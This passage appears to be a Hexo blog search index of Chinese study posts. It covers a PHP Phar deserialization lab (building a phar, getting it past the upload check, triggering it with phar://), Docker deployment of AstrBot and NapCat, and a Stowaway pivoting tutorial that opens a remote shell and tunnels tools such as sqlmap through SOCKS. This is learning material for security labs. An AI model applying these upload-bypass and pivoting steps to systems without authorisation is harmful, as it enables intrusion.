class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span><br><span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">TestObject</span> </span>&#123;<br>&#125;<br><br>@<span class="hljs-title function_ invoke__">unlink</span>(<span class="hljs-string">&#x27;test.phar&#x27;</span>);<br><span class="hljs-variable">$phar</span>=<span class="hljs-keyword">new</span> <span class="hljs-title class_">Phar</span>(<span class="hljs-string">&#x27;test.phar&#x27;</span>);<br><span class="hljs-variable">$phar</span>-&gt;<span class="hljs-title function_ invoke__">startBuffering</span>();<br><span class="hljs-variable">$phar</span>-&gt;<span class="hljs-title function_ invoke__">setStub</span>(<span class="hljs-string">&#x27;&lt;?php __HALT_COMPILER(); ?&gt;&#x27;</span>);<br><br><span class="hljs-variable">$o</span>=<span class="hljs-keyword">new</span> <span class="hljs-title class_">TestObject</span>();<br><br><span class="hljs-variable">$phar</span>-&gt;<span class="hljs-title function_ invoke__">setMetadata</span>(<span class="hljs-variable">$o</span>);<br><span class="hljs-variable">$phar</span>-&gt;<span class="hljs-title function_ invoke__">addFromString</span>(<span class="hljs-string">&quot;test.txt&quot;</span>,<span class="hljs-string">&quot;test&quot;</span>);<br><span class="hljs-variable">$phar</span>-&gt;<span class="hljs-title function_ invoke__">stopBuffering</span>();<br><span class="hljs-meta">?&gt;</span><br></code></pre></td></tr></table></figure><p><img src="/2025/04/25/Phar%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/image-20250421200642878.png" alt="image-20250421200642878"></p><p>然后就是在<code>upload.php</code>页面上传文件，抓包改后缀和MIME头就行</p><p><img src="/2025/04/25/Phar%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/image-20250421201143536.png" alt="image-20250421201143536"></p><p>可以看到成功上传进去了</p><p><img src="/2025/04/25/Phar%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/image-20250421201248601.png" alt="image-20250421201248601"></p><p>最后就是使用<code>phar</code>伪协议读取上传的文件</p><figure class="highlight awk"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs awk">file=phar:<span class="hljs-regexp">//</span><span class="hljs-regexp">/var/</span>www<span class="hljs-regexp">/html/</span>class23<span class="hljs-regexp">/upload/</span>test.png<br></code></pre></td></tr></table></figure><p><img src="/2025/04/25/Phar%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/image-20250421205949427.png" alt="image-20250421205949427"></p>]]></content>
    
    
    <categories>
      
      <category>漏洞笔记</category>
      
      <category>PHP反序列化</category>
      
    </categories>
    
    
    <tags>
      
      <tag>学习笔记</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>在Ubuntu云服务器部署AstrBot</title>
    <link href="/2025/04/25/%E5%9C%A8Ubuntu%E4%BA%91%E6%9C%8D%E5%8A%A1%E5%99%A8%E9%83%A8%E7%BD%B2AstrBot/"/>
    <url>/2025/04/25/%E5%9C%A8Ubuntu%E4%BA%91%E6%9C%8D%E5%8A%A1%E5%99%A8%E9%83%A8%E7%BD%B2AstrBot/</url>
    
    <content type="html"><![CDATA[<p>官方文档：<a href="https://astrbot.app/deploy/astrbot/docker.html">https://astrbot.app/deploy/astrbot/docker.html</a></p><h1 id="使用docker部署AstrBot"><a href="#使用docker部署AstrBot" class="headerlink" title="使用docker部署AstrBot"></a>使用docker部署AstrBot</h1><p>创建目录</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash"><span class="hljs-built_in">mkdir</span> astrbot<br></code></pre></td></tr></table></figure><p>docker部署</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash"><span class="hljs-built_in">sudo</span> docker run -itd -p 6180-6200:6180-6200 -p 11451:11451 -v <span class="hljs-variable">$PWD</span>/data:/AstrBot/data -v /etc/localtime:/etc/localtime:ro -v /etc/timezone:/etc/timezone:ro --name astrbot soulter/astrbot:latest<br></code></pre></td></tr></table></figure><p>查看日志</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash"><span class="hljs-built_in">sudo</span> docker logs -f astrbot<br></code></pre></td></tr></table></figure><p><img src="/2025/04/25/%E5%9C%A8Ubuntu%E4%BA%91%E6%9C%8D%E5%8A%A1%E5%99%A8%E9%83%A8%E7%BD%B2AstrBot/image-20250424122523476.png" alt="image-20250424122523476"></p><h1 id="使用NapCat部署消息平台"><a href="#使用NapCat部署消息平台" class="headerlink" title="使用NapCat部署消息平台"></a>使用NapCat部署消息平台</h1><h2 id="通过docker一键部署"><a href="#通过docker一键部署" class="headerlink" title="通过docker一键部署"></a>通过docker一键部署</h2><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><code class="hljs bash">docker run -d \<br>-e NAPCAT_GID=$(<span class="hljs-built_in">id</span> -g) \<br>-e NAPCAT_UID=$(<span class="hljs-built_in">id</span> -u) \<br>-p 3000:3000 \<br>-p 3001:3001 \<br>-p 6099:6099 \<br>--name napcat \<br>--restart=always \<br>mlikiowa/napcat-docker:latest<br></code></pre></td></tr></table></figure><p>查看日志获取登录二维码和管理面板的URL，QQ扫码登录就行</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">docker logs napcat<br></code></pre></td></tr></table></figure><p><img src="/2025/04/25/%E5%9C%A8Ubuntu%E4%BA%91%E6%9C%8D%E5%8A%A1%E5%99%A8%E9%83%A8%E7%BD%B2AstrBot/image-20250424123753911.png" alt="image-20250424123753911"></p><p>默认密码是napcat，记得修改密码</p><h2 id="连接到AstrBot"><a href="#连接到AstrBot" class="headerlink" title="连接到AstrBot"></a>连接到AstrBot</h2><p>进入部署好的进入 AstrBot 的管理面板，添加适配器</p><p><img src="/2025/04/25/%E5%9C%A8Ubuntu%E4%BA%91%E6%9C%8D%E5%8A%A1%E5%99%A8%E9%83%A8%E7%BD%B2AstrBot/image-20250424122732999.png" alt="image-20250424122732999"></p><p>ID随便填，启用要勾选，下面俩默认</p><p><img src="/2025/04/25/%E5%9C%A8Ubuntu%E4%BA%91%E6%9C%8D%E5%8A%A1%E5%99%A8%E9%83%A8%E7%BD%B2AstrBot/image-20250424122922656.png" alt="image-20250424122922656"></p><p>配置管理员，填写你的 QQ 号（不是机器人的 QQ 号），切记点击右下角 <code>保存</code>，AstrBot 重启并会应用配置</p><p><img src="/2025/04/25/%E5%9C%A8Ubuntu%E4%BA%91%E6%9C%8D%E5%8A%A1%E5%99%A8%E9%83%A8%E7%BD%B2AstrBot/image-20250424123013994.png" alt="image-20250424123013994"></p><h3 id="在-NapCatQQ-中添加-WebSocket-客户端"><a href="#在-NapCatQQ-中添加-WebSocket-客户端" class="headerlink" title="在 NapCatQQ 中添加 WebSocket 客户端"></a>在 NapCatQQ 中添加 WebSocket 客户端</h3><p><img src="/2025/04/25/%E5%9C%A8Ubuntu%E4%BA%91%E6%9C%8D%E5%8A%A1%E5%99%A8%E9%83%A8%E7%BD%B2AstrBot/image-20250424124357313.png" alt="image-20250424124357313"></p><p><img src="/2025/04/25/%E5%9C%A8Ubuntu%E4%BA%91%E6%9C%8D%E5%8A%A1%E5%99%A8%E9%83%A8%E7%BD%B2AstrBot/image-20250424124724178.png" alt="image-20250424124724178"></p><ul><li>启用勾选</li><li>名称随便填</li><li>URL填<code>ws://宿主机IP:端口/ws</code></li><li>消息格式为Array</li><li>Token就是密码</li><li>下面俩间隔都为5000</li></ul><p>看到以下就是配置好了</p><p><img src="/2025/04/25/%E5%9C%A8Ubuntu%E4%BA%91%E6%9C%8D%E5%8A%A1%E5%99%A8%E9%83%A8%E7%BD%B2AstrBot/image-20250424124812691.png" alt="image-20250424124812691"></p>]]></content>
    
    
    <categories>
      
      <category>环境搭建</category>
      
    </categories>
    
    
    <tags>
      
      <tag>环境搭建</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>内网代理</title>
    <link href="/2025/04/25/%E5%86%85%E7%BD%91%E4%BB%A3%E7%90%86/"/>
    <url>/2025/04/25/%E5%86%85%E7%BD%91%E4%BB%A3%E7%90%86/</url>
    
    <content type="html"><![CDATA[<h1 id="内网代理"><a href="#内网代理" class="headerlink" title="内网代理"></a>内网代理</h1><h2 id="安装配置stowaway"><a href="#安装配置stowaway" class="headerlink" title="安装配置stowaway"></a>安装配置stowaway</h2><p>Stowaway下载地址：<a href="https://github.com/ph4ntonn/Stowaway/releases">https://github.com/ph4ntonn/Stowaway/releases</a></p><p><img src="/2025/04/25/%E5%86%85%E7%BD%91%E4%BB%A3%E7%90%86/image-20250402231515350.png" alt="image-20250402231515350"></p><p>我使用的云服务器Ubuntu作为admin，自己的主机作为agent，所以选择上面这俩</p><p>把<code>linux_x64_admin</code>放在自己的VPS上</p><p><img src="/2025/04/25/%E5%86%85%E7%BD%91%E4%BB%A3%E7%90%86/image-20250402232141778.png" alt="image-20250402232141778"></p><p><code>windows_x64_agent.exe</code>就放在自己主机里</p><p><img src="/2025/04/25/%E5%86%85%E7%BD%91%E4%BB%A3%E7%90%86/image-20250402232241256.png" alt="image-20250402232241256"></p><p>命令如下：</p><figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs xml">在admin上：./linux_x64_admin -l <span class="hljs-tag">&lt;<span class="hljs-name">端口号</span>&gt;</span><br>在agent上：./windows_x64_agent.exe -c <span class="hljs-tag">&lt;<span class="hljs-name">admin的IP</span>&gt;</span>:<span class="hljs-tag">&lt;<span class="hljs-name">admin的端口</span>&gt;</span><br></code></pre></td></tr></table></figure><p>在这里的命令如下</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs bash">在admin上：./linux_x64_admin -l 9999<br>在agent上：./windows_x64_agent.exe -c 47.122.75.126:9999<br></code></pre></td></tr></table></figure><p>可能在admin机上执行命令时会出现以下权限报错</p><p><img src="/2025/04/25/%E5%86%85%E7%BD%91%E4%BB%A3%E7%90%86/image-20250402232706627.png" alt="image-20250402232706627"></p><p>这时只要输入以下命令即可</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash"><span class="hljs-built_in">chmod</span> +x linux_x64_admin<br></code></pre></td></tr></table></figure><p><img src="/2025/04/25/%E5%86%85%E7%BD%91%E4%BB%A3%E7%90%86/image-20250402232840262.png" alt="image-20250402232840262"></p><p>然后在自己主机上输入命令，注意要在<code>Windows PowerShell</code>里输入命令</p><p><img src="/2025/04/25/%E5%86%85%E7%BD%91%E4%BB%A3%E7%90%86/image-20250402233520977.png" alt="image-20250402233520977"></p><p>然后就会发现vps上多出了<code>(admin) &gt;&gt;</code>，这就是成功连上了</p><p><img src="/2025/04/25/%E5%86%85%E7%BD%91%E4%BB%A3%E7%90%86/image-20250402233622733.png" alt="image-20250402233622733"></p><p>然后输入<code>help</code>或者<code>h</code>就可以查看命令</p><p><img src="/2025/04/25/%E5%86%85%E7%BD%91%E4%BB%A3%E7%90%86/image-20250402233812557.png" alt="image-20250402233812557"></p><table><thead><tr><th>命令</th><th>功能</th></tr></thead><tbody><tr><td>help</td><td>显示帮助信息、命令</td></tr><tr><td>detail</td><td>显示已连接节点的信息</td></tr><tr><td>topo</td><td>显示节点的拓扑结构，直观了解各节点间的连接关系、布局等情况</td></tr><tr><td>use <id></td><td>用来选择用户想要使用的目标节点</td></tr><tr><td>exit</td><td>用于退出程序</td></tr></tbody></table><p><img src="/2025/04/25/%E5%86%85%E7%BD%91%E4%BB%A3%E7%90%86/image-20250402234326936.png" alt="image-20250402234326936"></p><p>这里<code>detail</code>展示连接节点的信息，然后使用命令<code>use 0</code>选择连这个主机，可以一次连接多个，如果有多个就<code>use &lt;id&gt;</code>，<code>id</code>就是前面的<code>Node[id]</code></p><p>连上后输入<code>help</code>命令，主要用<code>socks</code></p><p><img src="/2025/04/25/%E5%86%85%E7%BD%91%E4%BB%A3%E7%90%86/image-20250402234947008.png" alt="image-20250402234947008"></p><p>比如输入<code>shell</code>就拿到连接的主机权限，可以执行命令，如<code>ipconfig</code>查看<code>IP</code></p><p><img src="/2025/04/25/%E5%86%85%E7%BD%91%E4%BB%A3%E7%90%86/image-20250402235411194.png" alt="image-20250402235411194"></p><p>虽然有乱码但是无伤大雅，只要输入命令改为<code>utf-8</code>就行了</p><figure class="highlight apache"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs apache"><span class="hljs-attribute">chcp</span> <span class="hljs-number">65001</span><br></code></pre></td></tr></table></figure><p><img src="/2025/04/25/%E5%86%85%E7%BD%91%E4%BB%A3%E7%90%86/image-20250403000349590-1745557655943-1.png" alt="image-20250403000349590"></p><p>接下来开一个<code>socks</code>进行流量转发</p><figure class="highlight apache"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs apache"><span class="hljs-attribute">socks</span> <span class="hljs-number">15000</span><br></code></pre></td></tr></table></figure><p><img src="/2025/04/25/%E5%86%85%E7%BD%91%E4%BB%A3%E7%90%86/image-20250403000622117-1745557659184-3.png" alt="image-20250403000622117"></p><p>像上面图这样就是开成功了，然后是想要在自己本机上执行命令打到内网有三种方式</p><h2 id="第一种是使用Yakit"><a href="#第一种是使用Yakit" class="headerlink" title="第一种是使用Yakit"></a>第一种是使用<code>Yakit</code></h2><p>Yakit 下载网址：<a href="https://yaklang.com/">https://yaklang.com/</a></p><p>先来配置一下 Yakit</p><p><img src="/2025/04/25/%E5%86%85%E7%BD%91%E4%BB%A3%E7%90%86/image-20250403001646226-1745557663297-5.png" alt="image-20250403001646226"></p><p>点击选择这个项目</p><p><img src="/2025/04/25/%E5%86%85%E7%BD%91%E4%BB%A3%E7%90%86/image-20250403001726874-1745557667098-7.png" alt="image-20250403001726874"></p><p>然后点击左上角的 MITM</p><p><img src="/2025/04/25/%E5%86%85%E7%BD%91%E4%BB%A3%E7%90%86/image-20250403002025559-1745557671758-9.png" alt="image-20250403002025559"></p><p>然后配置，下游代理如下填写</p><figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs xml">socks5://<span class="hljs-tag">&lt;<span class="hljs-name">admin的IP</span>&gt;</span>:<span class="hljs-tag">&lt;<span class="hljs-name">admin的端口</span>&gt;</span><br></code></pre></td></tr></table></figure><p>我这里的就是</p><figure class="highlight dts"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs dts"><span class="hljs-symbol">socks5:</span><span class="hljs-comment">//47.122.75.126:15000</span><br></code></pre></td></tr></table></figure><p>然后点击劫持启动</p><p><img src="/2025/04/25/%E5%86%85%E7%BD%91%E4%BB%A3%E7%90%86/image-20250403002413167-1745557677013-11.png" alt="image-20250403002413167"></p><p>然后在弹出的浏览器输入连接的主机的ip和端口</p><p><img src="/2025/04/25/%E5%86%85%E7%BD%91%E4%BB%A3%E7%90%86/image-20250403002615527-1745557680916-13.png" alt="image-20250403002615527"></p><p><img src="/2025/04/25/%E5%86%85%E7%BD%91%E4%BB%A3%E7%90%86/image-20250403002710313-1745557684309-15.png" alt="image-20250403002710313"></p><p>可能会出现上面这样，把<code>https</code>改成<code>http</code>就行</p><p><img src="/2025/04/25/%E5%86%85%E7%BD%91%E4%BB%A3%E7%90%86/image-20250403002746222-1745557687495-17.png" alt="image-20250403002746222"></p><p>接下来就只要知道文件路径就可以访问了</p><p><img src="/2025/04/25/%E5%86%85%E7%BD%91%E4%BB%A3%E7%90%86/image-20250403002856812-1745557691220-19.png" alt="image-20250403002856812"></p><p>不过我这里是在我自己的主机里搞的，似乎本来就可以连接上</p><h2 id="第二种是用Proxifier"><a href="#第二种是用Proxifier" class="headerlink" title="第二种是用Proxifier"></a>第二种是用<code>Proxifier</code></h2><p>Proxifier下载激活博客：<a href="https://www.cnblogs.com/wushiyiwuzhong/p/17809020.html">https://www.cnblogs.com/wushiyiwuzhong/p/17809020.html</a></p><p>进行配置，找到导航栏 Profile-&gt;Proxy Servers</p><p><img src="/2025/04/25/%E5%86%85%E7%BD%91%E4%BB%A3%E7%90%86/image-20250403010419632-1745557696161-21.png" alt="image-20250403010419632"></p><p>添加一个代理</p><p><img src="/2025/04/25/%E5%86%85%E7%BD%91%E4%BB%A3%E7%90%86/image-20250403010858948-1745557700258-23.png" alt="image-20250403010858948"></p><p>然后还要配置一个，就是第二个 Proxification Rules</p><p><img src="/2025/04/25/%E5%86%85%E7%BD%91%E4%BB%A3%E7%90%86/image-20250403011335167-1745557703543-25.png" alt="image-20250403011335167"></p><p>现在就相当于在我主机的内网上了（虽然我现在本身就是用的自己的主机，不过过程就是这个过程）</p><h2 id="第三种是使用在kali里的proxychains"><a href="#第三种是使用在kali里的proxychains" class="headerlink" title="第三种是使用在kali里的proxychains"></a>第三种是使用在<code>kali</code>里的<code>proxychains</code></h2><p>在kali中是自带<code>proxychains</code>的</p><p><img src="/2025/04/25/%E5%86%85%E7%BD%91%E4%BB%A3%E7%90%86/image-20250403003441163-1745557706372-27.png" alt="image-20250403003441163"></p><p>使用这个前要进行配置文件</p><figure class="highlight vim"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs vim"><span class="hljs-keyword">vim</span> /etc/proxychains4.<span class="hljs-keyword">conf</span><br></code></pre></td></tr></table></figure><p>直接拉到最后一行，如下图</p><p><img src="/2025/04/25/%E5%86%85%E7%BD%91%E4%BB%A3%E7%90%86/image-20250403003827997-1745557709281-29.png" alt="image-20250403003827997"></p><p>然后把<code>socks4</code>那行注释掉，在最后加入<code>socks5 &lt;admin的IP&gt; &lt;admin的端口&gt;</code></p><p><img src="/2025/04/25/%E5%86%85%E7%BD%91%E4%BB%A3%E7%90%86/image-20250403004047794-1745557712320-31.png" alt="image-20250403004047794"></p><p>保存退出，这就和前面的一样做流量转发</p><p>然后就可以执行命令，在前面加入<code>proxychains</code>就行</p><p><img src="/2025/04/25/%E5%86%85%E7%BD%91%E4%BB%A3%E7%90%86/image-20250403004412418-1745557715271-33.png" alt="image-20250403004412418"></p><p>甚至可以跑sqlmap</p><p><img src="/2025/04/25/%E5%86%85%E7%BD%91%E4%BB%A3%E7%90%86/image-20250403004640275-1745557719747-35.png" alt="image-20250403004640275"></p><p>OK，完事，撒花~~~</p>]]></content>
    
    
    <categories>
      
      <category>小知识</category>
      
    </categories>
    
    
    <tags>
      
      <tag>小知识</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>Hello World</title>
    <link href="/2025/04/25/hello-world/"/>
    <url>/2025/04/25/hello-world/</url>
    
    <content type="html"><![CDATA[<p>Welcome to <a href="https://hexo.io/">Hexo</a>! This is your very first post. Check <a href="https://hexo.io/docs/">documentation</a> for more info. If you get any problems when using Hexo, you can find the answer in <a href="https://hexo.io/docs/troubleshooting.html">troubleshooting</a> or you can ask me on <a href="https://github.com/hexojs/hexo/issues">GitHub</a>.</p><h2 id="Quick-Start"><a href="#Quick-Start" class="headerlink" title="Quick Start"></a>Quick Start</h2><h3 id="Create-a-new-post"><a href="#Create-a-new-post" class="headerlink" title="Create a new post"></a>Create a new post</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">$ hexo new <span class="hljs-string">&quot;My New Post&quot;</span><br></code></pre></td></tr></table></figure><p>More info: <a href="https://hexo.io/docs/writing.html">Writing</a></p><h3 id="Run-server"><a href="#Run-server" class="headerlink" title="Run server"></a>Run server</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">$ hexo server<br></code></pre></td></tr></table></figure><p>More info: <a href="https://hexo.io/docs/server.html">Server</a></p><h3 id="Generate-static-files"><a href="#Generate-static-files" class="headerlink" title="Generate static files"></a>Generate static files</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">$ hexo generate<br></code></pre></td></tr></table></figure><p>More info: <a href="https://hexo.io/docs/generating.html">Generating</a></p><h3 id="Deploy-to-remote-sites"><a href="#Deploy-to-remote-sites" class="headerlink" title="Deploy to remote sites"></a>Deploy to remote sites</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">$ hexo deploy<br></code></pre></td></tr></table></figure><p>More info: <a href="https://hexo.io/docs/one-command-deployment.html">Deployment</a></p>]]></content>
    
    
    
  </entry>
  
  
  
  
  
  
  <entry>
    <title>test</title>
    <link href="/"/>
    <url>/</url>
    
    <content type="html"><![CDATA[]]></content>
    
  </entry>
  
  
  
</search>
